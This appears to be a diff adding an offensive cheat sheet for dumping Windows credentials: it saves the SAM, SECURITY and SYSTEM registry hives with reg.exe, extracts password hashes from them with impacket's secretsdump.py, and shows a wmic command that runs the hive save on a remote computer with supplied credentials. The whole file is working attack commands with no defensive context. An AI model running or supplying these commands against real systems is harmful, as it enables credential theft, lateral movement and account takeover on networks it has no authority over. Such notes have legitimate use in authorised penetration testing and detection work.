@@ -1,0 +1,9 @@
+reg.exe save hklm\sam c:\temp\sam.save
+reg.exe save hklm\security c:\temp\security.save
+reg.exe save hklm\system c:\temp\system.save
+secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+
+#https://github.com/CoreSecurity/impacket/blob/master/examples/secretsdump.py
+
+#Do this remotely
+wmic /node:"<computer_name>" /user:"<username>" /password:"<password>" process call create "cmd.exe /c reg save hklm\sam C:\temp\sam.save"
